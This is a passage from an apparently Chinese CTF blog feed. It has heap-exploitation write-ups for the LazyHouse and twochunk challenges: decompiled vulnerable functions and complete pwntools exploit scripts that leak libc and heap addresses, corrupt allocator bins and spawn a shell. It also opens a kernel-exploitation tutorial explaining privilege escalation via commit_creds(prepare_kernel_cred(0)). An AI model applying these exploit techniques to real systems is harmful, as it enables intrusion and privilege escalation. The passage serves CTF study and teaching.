money);        writeline_buf(&amp;s);        qword_5060[3 * v1 + 2] = size &lt;&lt; 6;        qword_5060[3 * v1 + 1] = size;        money -= 0xDA * size;        buf = calloc(1uLL, size);        if ( buf )        {          write_buf(&quot;House:&quot;);          read_buf((__int64)buf, size);          qword_5060[3 * v1] = buf;        }</code></pre><p>upgrade 中可以多写 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk，buy_super 是隐藏函数，调用 malloc：</p><pre><code class="cpp">void *upgrade(){  __int64 v0; // ST08_8  void *result; // rax  unsigned __int64 v2; // [rsp+0h] [rbp-10h]  if ( unk_5018 &lt;= 0 )    return (void *)writeline_buf(&quot;You cannot upgrade again !&quot;);  write_buf(&quot;Index:&quot;);  v2 = read_long();  if ( v2 &gt; 7 || !qword_5060[3 * v2] )    return (void *)writeline_buf(&quot;Invalid !&quot;);  v0 = qword_5060[3 * v2 + 1];  write_buf(&quot;House:&quot;);  read_buf(qword_5060[3 * v2], v0 + 0x20);  qword_5060[3 * v2 + 2] = 218 * v0;  result = &amp;unk_5018;  --unk_5018;  return result;}unsigned __int64 buy_super(){  char s; // [rsp+0h] [rbp-310h]  unsigned __int64 v2; // [rsp+308h] [rbp-8h]  v2 = __readfsqword(0x28u);  if ( qword_5040[0] )  {    writeline_buf(&quot;Lays already has a super house!&quot;);  }  else  {    if ( money &lt;= 0x216FFFFFuLL )    {      writeline_buf(&quot;You don&#39;t have enough money to buy the luxury house&quot;);      _exit(535);    }    money -= 0x21700000LL;    memset(&amp;s, 0, 0x300uLL);    write_buf(&quot;House:&quot;);    read_buf((__int64)&amp;s, 0x217u);    qword_5040[0] = malloc(0x217uLL);    memset((void *)qword_5040[0], 0, 0x217uLL);    strncpy((char *)qword_5040[0], &amp;s, 0x217uLL);    qword_5040[2] = (const void *)0x21700000;    qword_5040[1] = &amp;off_210 + 7;    writeline_buf(&quot;Done!&quot;);  }  return __readfsqword(0x28u) ^ v2;}</code></pre><p>一开始通过乘法溢出来改 money 的大小，然后利用 largebins 同时泄漏 heap 和 libc。然后通过 unlink 构造 overlapping，最后构造好 smallbins 的 bk，依次取构造好的 Chunk。Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./lazyhouse&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;choice: &#39;)    p.sendline(str(c))def new(idx, sz, content):    cmd(1)    p.recvuntil(&#39;Your money:&#39;)    money = int(p.recvuntil(&#39;\n&#39;, drop=True))    info(&#39;money = &#39; + hex(money))    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Size:&#39;)    p.sendline(str(sz))    if sz &lt; pow(2, 32):        p.recvuntil(&#39;House:&#39;)        p.send(content)        sleep(0.1)def show(idx):    cmd(2)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))def free(idx):    cmd(3)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))def edit(idx, content):    cmd(4)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;House:&#39;)    p.send(content)    sleep(0.1)def secret(content):    cmd(5)    p.recvuntil(&#39;House:&#39;)    p.send(content)    sleep(0.1)size = int((pow(2, 64) - 1) // 0xDA) + 1info(&#39;size = &#39; + hex(size))new(0, size, &#39;0&#39;) # bypassfree(0)new(0, 0x88, &#39;0&#39;)new(1, 0x508, &#39;1&#39;) # put into largebins later for leaknew(2, 0x88, &#39;2&#39;)free(1)new(1, 0x608, &#39;1&#39;) # trigger consolidate ; put 0x508 into largebinsedit(0, &#39;\x00&#39; * 0x88 + p64(0x513)) # set IS_MMAPEDnew(7, 0x508, &#39;7&#39;)show(7)leak_data = p.recvn(0x500)libc_base = u64(leak_data[0x8:0x10]) - 0x1e50d0info(&#39;libc_base = &#39; + hex(libc_base))heap_base = u64(leak_data[0x10:0x18]) - 0x2e0info(&#39;heap_base = &#39; + hex(heap_base))#gdb.attach(p)free(0)free(1)free(2)size = 0x90 * 4 - 0x10target = heap_base + 0x890payload = p64(0) + p64(size | 1) + p64(target + 0x20 - 0x18) + p64(target + 0x20 - 0x10) + p64(target)new(6, 0x88, payload) # create fake chunk for unlinknew(5, 0x88, &#39;5&#39;)new(0, 0x88, &#39;0&#39;)new(1, 0x88, &#39;1&#39;)new(2, 0x608, &#39;\x00&#39; * 0x508 + p64(0x101))edit(1, &#39;\x00&#39; * 0x80 + p64(size) + p64(0x610)) # overwrite prev_size &amp; size (PREV_INUSE)free(2) # unlinkpayload = (    &#39;\x00&#39; * 0x78 + p64(0x6c1) + # 5    &#39;\x00&#39; * 0x88 + p64(0x31) + # 0    &#39;\x00&#39; * 0x88 + p64(0x21) # 1)new(2, 0x508, payload) # merge into top chunkfree(0)free(1)free(2)#gdb.attach(p)new(0, 0x1a8, &#39;\x00&#39; * 0x78 + p64(0x6c1))new(1, 0x218, &#39;1&#39;)new(2, 0x218, &#39;2&#39;)free(2)new(2, 0x218, &#39;\x00&#39; * 0x148 + p64(0xd1)) # create fake chunk ; bypass checkfree(2)for i in range(5):    new(2, 0x218, &#39;2&#39;)    free(2) # fillup tcache 0x220new(2, 0x3a8, &#39;2&#39;)free(2) # create fake size in tcache_pthread_struct#raw_input(&#39;@&#39;)free(1)new(1, 0x228, &#39;1&#39;) # trigger consolidate ; put into smallbins 0x100free(5)#raw_input(&#39;@&#39;)smallbins_addr = libc_base + 0x1e4eb0tcache_fake_chunk_addr = heap_base + 0x40payload = &#39;\x00&#39; * 0x98 + p64(0x31) + p64(tcache_fake_chunk_addr) + &#39;\x00&#39; * 0x80 + p64(0x221) + p64(smallbins_addr) + p64(tcache_fake_chunk_addr)new(5, 0x6b1, payload)#raw_input(&#39;@&#39;)pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))pop_rax_ret = libc_base + next(libc.search(asm(&#39;pop rax ; ret&#39;)))leave_ret = libc_base + next(libc.search(asm(&#39;leave ; ret&#39;)))syscall_ret = libc_base + next(libc.search(asm(&#39;syscall ; ret&#39;)))#bin_sh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))bin_sh_addr = heap_base + 0xa50malloc_hook_addr = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]rop_offset = heap_base + 0xa70 - 0x8payload = &#39;/bin/sh&#39;.ljust(0x20, &#39;\x00&#39;) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)new(3, 0x218, payload) # set rop chain#raw_input(&#39;@&#39;)new(2, 0x218, p64(0) * 0x20 + p64(malloc_hook_addr)) # overwrite tcache 0x220&#39;s entrysecret(p64(leave_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))#raw_input(&#39;@&#39;)new(4, rop_offset, &#39;4&#39;)p.interactive()</code></pre><h2 id="2020-XCTF-GXZY-twochunk（tcache-stashing-unlink-attack-plus-plus）"><a href="#2020-XCTF-GXZY-twochunk（tcache-stashing-unlink-attack-plus-plus）" class="headerlink" title="2020-XCTF-GXZY-twochunk（tcache stashing unlink attack plus plus）"></a>2020-XCTF-GXZY-twochunk（tcache stashing unlink attack plus plus）</h2><blockquote><p>环境：Ubuntu 20.04（VMware Fusion）</p></blockquote><p>这道题目在 IDA 中也需要修复一下 switch 语句。和前面一样，add 中调用 calloc，而且不能用 fastbins。这里有三个隐藏函数，分别可以用来泄漏 libc、写 system 以及调用。作者的意图比较明显，基本上就是 tcache stashing unlink attack plus plus 了：</p><pre><code class="cpp">__int64 info(){  if ( !dword_4018 )    failed();  printf(&quot;name: %s&quot;, buf);  printf(&quot;message: %s\n&quot;, buf + 48);  return (unsigned int)(dword_4018-- - 1);}__int64 write_buf(){  void *buf; // ST08_8  if ( !dword_401C )    failed();  printf(&quot;leave your end message: &quot;);  buf = malloc(0x88uLL);  read(0, buf, 0x80uLL);  return (unsigned int)(dword_401C-- - 1);}__int64 execute(){  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))buf)(           *((_QWORD *)buf + 6),           *((_QWORD *)buf + 7),           *((_QWORD *)buf + 8));}</code></pre><p>漏洞同样是 edit 的时候可以多读 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk：</p><pre><code class="cpp">__int64 edit(){  int idx; // [rsp+Ch] [rbp-4h]  puts(&quot;just edit once!&quot;);  if ( !edit_flag )    failed();  printf(&quot;idx: &quot;);  idx = read_int_();  if ( !*((_QWORD *)&amp;unk_40A0 + 2 * idx) )    failed();  printf(&quot;content: &quot;);  read(0, *((void **)&amp;unk_40A0 + 2 * idx), *((_DWORD *)&amp;unk_40A8 + 4 * idx) + 0x20);  return (unsigned int)(edit_flag-- - 1);}</code></pre><p>Exploit：</p><pre><code class="python">#!/usr/bin/env python3from pwn import *#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./twochunk&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def intro(name, msg):    p.recvuntil(&#39;name: &#39;)    p.send(name)    sleep(0.1)    p.recvuntil(&#39;your message: &#39;)    p.send(msg)    sleep(0.1)def cmd(c):    p.recvuntil(&#39;choice: &#39;)    p.sendline(str(c))def add(idx, sz):    cmd(1)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;size: &#39;)    p.sendline(str(sz))def free(idx):    cmd(2)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def show(idx):    cmd(3)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def edit(idx, content):    cmd(4)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;content: &#39;)    p.send(content)    sleep(0.1)buf = 0x23333000 + 0x30intro(p64(buf - 0x10) * 6, p64(0xdeadbeef))for i in range(5):    add(0, 0x88)    free(0) # fillup tcache 0x90# leak heapadd(0, 0xE9)free(0) # put into tcache 0x100add(0, 0xE9)free(0) # put into tcache 0x100add(0, 0x5B25) # get a chunk from tcache 0x100show(0)heap_base = u64(p.recv(8)) - 0x570info(&#39;heap_base = &#39; + hex(heap_base))free(0)for i in range(7):    add(0, 0x188)    free(0) # fillup tcache 0x190# create smallbinsadd(0, 0x188)add(1, 0x308) # paddingfree(0) # put into unsortedbinadd(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90free(0)add(0, 0x108) # trigger consolidate ; put into smallbin 0x90free(0)free(1)# repeatadd(0, 0x188)add(1, 0x308) # paddingfree(0) # put into unsortedbinfree(1)add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90add(1, 0x108) # trigger consolidate ; put into smallbin 0x90#gdb.attach(p)target = 0x23333000payload = b&#39;\x00&#39; * 0xf0 + p64(0) + p64(0x91) + p64(heap_base + 0x1350) + p64(target - 0x10)#payload = p64(0xdeadbeef)edit(0, payload) # overwrite smallbins&#39; bkfree(1)add(1, 0x88) # trigger smallbin stash unlink# leak libccmd(5)p.recvuntil(&#39;message: &#39;)libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x1ebc60info(&#39;libc_base = &#39; + hex(libc_base))system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))cmd(6)payload = p64(system_addr).ljust(0x30, b&#39;\x00&#39;) + p64(bin_sh_addr) + p64(0) + p64(0)p.send(payload)cmd(7)#gdb.attach(p)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mp.weixin.qq.com/s/9HikpVaV5tpuBtu6hcAt3A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9HikpVaV5tpuBtu6hcAt3A</a><br><a href="https://tianstcht.github.io/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/" target="_blank" rel="noopener">https://tianstcht.github.io/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/</a><br><a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312" target="_blank" rel="noopener">https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312</a><br><a href="https://balsn.tw/ctf_writeup/20191012-hitconctfquals/" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20191012-hitconctfquals/</a><br><a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse/" target="_blank" rel="noopener">http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse/</a><br><a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/" target="_blank" rel="noopener">http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic Kernel Exploitation</title>
    <link href="/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/"/>
    <url>/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/</url>
    
    <content type="html"><![CDATA[<p>初涉 Kernel Exploit。</p><a id="more"></a><blockquote><p>基本是跟着 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">CTF-Wiki</a> 和 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x 师傅</a>做的内容。</p></blockquote><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p>一部分内容在 <a href="https://github.com/qianfei11/UnixNotebook" target="_blank" rel="noopener">Unix 系统分析课的笔记</a>中有所记录。</p><h2 id="What-is-kernel"><a href="#What-is-kernel" class="headerlink" title="What is kernel?"></a>What is kernel?</h2><p>Kernel 是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。最主要的功能有两点（包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能）：</p><ol><li>控制并与硬件进行交互；</li><li>提供 Application 能运行的环境。</li></ol><blockquote><p>应用程序的 crash 直接终止程序，而内核的 crash 会直接引发重启。</p></blockquote><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>Intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2 和 Ring 3。Ring 0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。而使用 Ring Model 是为了提升系统安全性。</p><blockquote><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p></blockquote><h2 id="Loadable-Kernel-Modules（LKMs）"><a href="#Loadable-Kernel-Modules（LKMs）" class="headerlink" title="Loadable Kernel Modules（LKMs）"></a>Loadable Kernel Modules（LKMs）</h2><p>可加载核心模块（内核模块）就像运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序（Device Drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><blockquote><p>LKMs 的文件格式和用户态的可执行程序相同，因此可以使用 IDA 等工具来分析内核模块。</p></blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核（Monolithic Kernel）。单内核的优点是效率高，所有的内容都集合在一起，但是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装。</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><code>ioctl</code> 是一个系统调用，用于与设备通信：</p><pre><code class="txt">IOCTL(2)                    BSD System Calls Manual                   IOCTL(2)NAME     ioctl -- control deviceSYNOPSIS     #include &lt;sys/ioctl.h&gt;     int     ioctl(int fildes, unsigned long request, ...);DESCRIPTION     The ioctl() function manipulates the underlying device parameters of special files.  In particular, many operat-     ing characteristics of character special files (e.g. terminals) may be controlled with ioctl() requests.  The     argument fildes must be an open file descriptor.     An  ioctl request has encoded in it whether the argument is an ``in&#39;&#39; parameter or ``out&#39;&#39; parameter, and the     size of the argument argp in bytes.  Macros and defines used in specifying an ioctl request are located in the     file &lt;sys/ioctl.h&gt;.</code></pre><ul><li>第一个参数 <code>fildes</code> 为打开设备返回的文件描述符；</li><li>第二个参数 <code>request</code> 为用户程序对设备的控制命令；</li><li>再后边的参数则是一些补充参数，与设备有关。</li></ul><p>内核使用 <code>ioctl</code> 进行通信的原因：</p><ul><li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址，但访问非标准硬件设备这些系统调用显得不合适，有时候用户模式可能需要直接访问设备；</li><li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 <code>ioctl</code> 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li></ul><h2 id="Status-Switching"><a href="#Status-Switching" class="headerlink" title="Status Switching"></a>Status Switching</h2><h3 id="User-Space-to-Kernel-Space"><a href="#User-Space-to-Kernel-Space" class="headerlink" title="User Space to Kernel Space"></a>User Space to Kernel Space</h3><p>当发生<strong>系统调用</strong>、产生<strong>异常、</strong>外设产生<strong>中断</strong>等事件时，会发生用户态到内核态的切换。步骤如下：</p><ol><li>用 <code>SWAPGS</code> 指令切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用；</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 RSP/ESP；</li><li>用 PUSH 指令保存各寄存器值；</li><li>判断是否为 <code>x32_abi</code>；</li><li>根据系统调用号跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><p><a href="https://elixir.bootlin.com/linux/v4.12/source/arch/x86/entry/entry_64.S#L136" target="_blank" rel="noopener">保存用户态各个寄存器的值</a>：</p><pre><code class="nasm">ENTRY(entry_SYSCALL_64)    /*     * Interrupts are off on entry.     * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,     * it is too small to ever cause noticeable irq latency.     */    SWAPGS_UNSAFE_STACK    /*     * A hypervisor implementation might want to use a label     * after the swapgs, so that it can do the swapgs     * for the guest and jump here on syscall.     */GLOBAL(entry_SYSCALL_64_after_swapgs)    movq    %rsp, PER_CPU_VAR(rsp_scratch)    movq    PER_CPU_VAR(cpu_current_top_of_stack), %rsp    TRACE_IRQS_OFF    /* Construct struct pt_regs on stack */    pushq    $__USER_DS            /* pt_regs-&gt;ss */    pushq    PER_CPU_VAR(rsp_scratch)    /* pt_regs-&gt;sp */    pushq    %r11                /* pt_regs-&gt;flags */    pushq    $__USER_CS            /* pt_regs-&gt;cs */    pushq    %rcx                /* pt_regs-&gt;ip */    pushq    %rax                /* pt_regs-&gt;orig_ax */    pushq    %rdi                /* pt_regs-&gt;di */    pushq    %rsi                /* pt_regs-&gt;si */    pushq    %rdx                /* pt_regs-&gt;dx */    pushq    %rcx                /* pt_regs-&gt;cx */    pushq    $-ENOSYS            /* pt_regs-&gt;ax */    pushq    %r8                /* pt_regs-&gt;r8 */    pushq    %r9                /* pt_regs-&gt;r9 */    pushq    %r10                /* pt_regs-&gt;r10 */    pushq    %r11                /* pt_regs-&gt;r11 */    sub    $(6*8), %rsp            /* pt_regs-&gt;bp, bx, r12-15 not saved */</code></pre><h3 id="Kernel-Space-to-User-Space"><a href="#Kernel-Space-to-User-Space" class="headerlink" title="Kernel Space to User Space"></a>Kernel Space to User Space</h3><p>退出内核态的步骤如下：</p><ol><li>通过 <code>SWAPGS</code> 恢复 GS 值；</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户上下文继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, EFLAGS/RFLAGS, ESP/RSP 等）。</li></ol><h2 id="Process-Structure"><a href="#Process-Structure" class="headerlink" title="Process Structure"></a>Process Structure</h2><p>Kernel 中使用 <a href="https://elixir.bootlin.com/linux/v4.12/source/include/linux/cred.h#L110" target="_blank" rel="noopener"><code>cred</code> 结构体</a>记录进程的权限等信息（uid、gid 等），如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p><pre><code class="cpp">/* * The security context of a task * * The parts of the context break down into two categories: * *  (1) The objective context of a task.  These parts are used when some other *    task is attempting to affect this one. * *  (2) The subjective context.  These details are used when the task is acting *    upon another object, be that a file, a task, a key or whatever. * * Note that some members of this structure belong to both categories - the * LSM security pointer for instance. * * A task has two security pointers.  task-&gt;real_cred points to the objective * context that defines that task&#39;s actual details.  The objective part of this * context is used whenever that task is acted upon. * * task-&gt;cred points to the subjective context that defines the details of how * that task is going to act upon another object.  This may be overridden * temporarily to point to another security context, but normally points to the * same context as task-&gt;real_cred. */struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><h2 id="Functions-in-Kernel"><a href="#Functions-in-Kernel" class="headerlink" title="Functions in Kernel"></a>Functions in Kernel</h2><p>内核态中的函数对应用户态函数：</p><ul><li><code>printf()</code> -&gt; <code>printk()</code><ul><li><code>printk()</code> 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li></ul></li><li><code>memcpy()</code> -&gt; <code>copy_from_user()</code>/<code>copy_to_user()</code><ul><li><code>copy_from_user()</code>：实现了将用户空间的数据传送到内核空间</li><li><code>copy_to_user()</code>：实现了将内核空间的数据传送到用户空间</li></ul></li><li><code>malloc()</code> -&gt; <code>kmalloc()</code><ul><li>内核态的内存分配函数，和 <code>malloc()</code> 相似，但使用的是 <code>slab/slub</code> 分配器</li></ul></li><li><code>free()</code> -&gt; <code>kfree()</code>，同 <code>kmalloc()</code></li></ul><p>同时 Kernel 中有两个（<a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L423" target="_blank" rel="noopener"><code>int commit_creds(struct cred *new)</code></a> 和 <a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L595" target="_blank" rel="noopener"><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code></a>）可以改变权限的函数：</p><pre><code class="cpp">/** * commit_creds - Install new credentials upon the current task * @new: The credentials to be assigned * * Install a new set of credentials to the current task, using RCU to replace * the old set.  Both the objective and the subjective credentials pointers are * updated.  This function may not be called if the subjective credentials are * in an overridden state. * * This function eats the caller&#39;s reference to the new credentials. * * Always returns 0 thus allowing this function to be tail-called at the end * of, say, sys_setgid(). */int commit_creds(struct cred *new){    struct task_struct *task = current;    const struct cred *old = task-&gt;real_cred;    kdebug(&quot;commit_creds(%p{%d,%d})&quot;, new,           atomic_read(&amp;new-&gt;usage),           read_cred_subscribers(new));    BUG_ON(task-&gt;cred != old);#ifdef CONFIG_DEBUG_CREDENTIALS    BUG_ON(read_cred_subscribers(old) &lt; 2);    validate_creds(old);    validate_creds(new);#endif    BUG_ON(atomic_read(&amp;new-&gt;usage) &lt; 1);    get_cred(new); /* we will require a ref for the subj creds too */    /* dumpability changes */    if (!uid_eq(old-&gt;euid, new-&gt;euid) ||        !gid_eq(old-&gt;egid, new-&gt;egid) ||        !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||        !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||        !cred_cap_issubset(old, new)) {        if (task-&gt;mm)            set_dumpable(task-&gt;mm, suid_dumpable);        task-&gt;pdeath_signal = 0;        smp_wmb();    }    /* alter the thread keyring */    if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))        key_fsuid_changed(task);    if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))        key_fsgid_changed(task);    /* do it     * RLIMIT_NPROC limits on user-&gt;processes have already been checked     * in set_user().     */    alter_cred_subscribers(new, 2);    if (new-&gt;user != old-&gt;user)        atomic_inc(&amp;new-&gt;user-&gt;processes);    rcu_assign_pointer(task-&gt;real_cred, new);    rcu_assign_pointer(task-&gt;cred, new);    if (new-&gt;user != old-&gt;user)        atomic_dec(&amp;old-&gt;user-&gt;processes);    alter_cred_subscribers(old, -2);    /* send notifications */    if (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||        !uid_eq(new-&gt;euid,  old-&gt;euid) ||        !uid_eq(new-&gt;suid,  old-&gt;suid) ||        !uid_eq(new-&gt;fsuid, old-&gt;fsuid))        proc_id_connector(task, PROC_EVENT_UID);    if (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||        !gid_eq(new-&gt;egid,  old-&gt;egid) ||        !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||        !gid_eq(new-&gt;fsgid, old-&gt;fsgid))        proc_id_connector(task, PROC_EVENT_GID);    /* release the old obj and subj refs both */    put_cred(old);    put_cred(old);    return 0;}/** * prepare_kernel_cred - Prepare a set of credentials for a kernel service * @daemon: A userspace daemon to be used as a reference * * Prepare a set of credentials for a kernel service.  This can then be used to * override a task&#39;s own credentials so that work can be done on behalf of that * task that requires a different subjective context. * * @daemon is used to provide a base for the security record, but can be NULL. * If @daemon is supplied, then the security data will be derived from that; * otherwise they&#39;ll be set to 0 and no groups, full capabilities and no keys. * * The caller may change these controls afterwards if desired. * * Returns the new credentials or NULL if out of memory. * * Does not take, and does not return holding current-&gt;cred_replace_mutex. */struct cred *prepare_kernel_cred(struct task_struct *daemon){    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);    validate_creds(old);    *new = *old;    atomic_set(&amp;new-&gt;usage, 1);    set_cred_subscribers(new, 0);    get_uid(new-&gt;user);    get_user_ns(new-&gt;user_ns);    get_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS    new-&gt;session_keyring = NULL;    new-&gt;process_keyring = NULL;    new-&gt;thread_keyring = NULL;    new-&gt;request_key_auth = NULL;    new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY    new-&gt;security = NULL;#endif    if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)        goto error;    put_cred(old);    validate_creds(new);    return new;error:    put_cred(new);    put_cred(old);    return NULL;}</code></pre><p>执行 <code>commit_creds(prepare_kernel_cred(0));</code> 即可获得 root 权限。两个函数的地址都可以在 <code>/proc/kallsyms</code> 文件中查看：</p><pre><code class="bash">$ sudo cat /proc/kallsyms | grep -E &quot;commit_creds|prepare_kernel_cred&quot;ffffffff810a24a0 T commit_credsffffffff810a2890 T prepare_kernel_credffffffff81d7f6c0 R __ksymtab_commit_credsffffffff81d881d0 R __ksymtab_prepare_kernel_credffffffff81d9f028 r __kcrctab_commit_credsffffffff81da35b0 r __kcrctab_prepare_kernel_credffffffff81db01e7 r __kstrtab_prepare_kernel_credffffffff81db022e r __kstrtab_commit_creds</code></pre><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><ul><li>CANARY、DEP、PIE、RELRO 等保护与用户态原理和作用相同；</li><li>smep（Supervisor Mode Execution Protection）：当处理器处于 Ring 0 模式时，执行用户空间的代码会触发页错误；</li><li>smap（Superivisor Mode Access Protection）：类似于 